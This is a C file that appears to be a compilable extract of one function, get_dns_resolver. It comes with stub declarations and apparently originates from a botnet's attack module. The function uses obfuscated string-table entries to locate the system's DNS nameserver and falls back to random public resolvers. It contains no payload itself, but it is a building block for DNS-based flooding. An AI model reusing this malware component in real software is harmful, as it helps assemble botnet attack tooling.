#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  resolvbuf ;
typedef  int /*<<< orphan*/  ipv4_t ;
typedef  scalar_t__ BOOL ;

/* Variables and functions */
 scalar_t__ FALSE ; 
 int /*<<< orphan*/  INET_ADDR (int,int,int,int) ; 
 int /*<<< orphan*/  O_RDONLY ; 
 int /*<<< orphan*/  TABLE_ATK_NSERV ; 
 int /*<<< orphan*/  TABLE_ATK_RESOLVER ; 
 scalar_t__ TRUE ; 
 int /*<<< orphan*/  close (int) ; 
 int /*<<< orphan*/  inet_addr (char*) ; 
 int open (int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  printf (char*,char*) ; 
 int rand_next () ; 
 int read (int,char*,int) ; 
 int /*<<< orphan*/  table_lock_val (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  table_retrieve_val (int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  table_unlock_val (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  util_memcpy (char*,char*,int) ; 
 int util_stristr (char*,int,int /*<<< orphan*/ ) ; 

__attribute__((used)) static ipv4_t get_dns_resolver(void)
{
    int fd;

    table_unlock_val(TABLE_ATK_RESOLVER);
    fd = open(table_retrieve_val(TABLE_ATK_RESOLVER, NULL), O_RDONLY);
    table_lock_val(TABLE_ATK_RESOLVER);
    if (fd >= 0)
    {
        int ret, nspos;
        char resolvbuf[2048];

        ret = read(fd, resolvbuf, sizeof (resolvbuf));
        close(fd);
        table_unlock_val(TABLE_ATK_NSERV);
        nspos = util_stristr(resolvbuf, ret, table_retrieve_val(TABLE_ATK_NSERV, NULL));
        table_lock_val(TABLE_ATK_NSERV);
        if (nspos != -1)
        {
            int i;
            char ipbuf[32];
            BOOL finished_whitespace = FALSE;
            BOOL found = FALSE;

            for (i = nspos; i < ret; i++)
            {
                char c = resolvbuf[i];

                // Skip leading whitespace
                if (!finished_whitespace)
                {
                    if (c == ' ' || c == '\t')
                        continue;
                    else
                        finished_whitespace = TRUE;
                }

                // End if c is not either a dot or a number
                if ((c != '.' && (c < '0' || c > '9')) || (i == (ret - 1)))
                {
                    util_memcpy(ipbuf, resolvbuf + nspos, i - nspos);
                    ipbuf[i - nspos] = 0;
                    found = TRUE;
                    break;
                }
            }

            if (found)
            {
#ifdef DEBUG
                printf("Found local resolver: '%s'\n", ipbuf);
#endif
                return inet_addr(ipbuf);
            }
        }
    }

    switch (rand_next() % 4)
    {
    case 0:
        return INET_ADDR(8,8,8,8);
    case 1:
        return INET_ADDR(74,82,42,42);
    case 2:
        return INET_ADDR(64,6,64,6);
    case 3:
        return INET_ADDR(4,2,2,2);
    }
}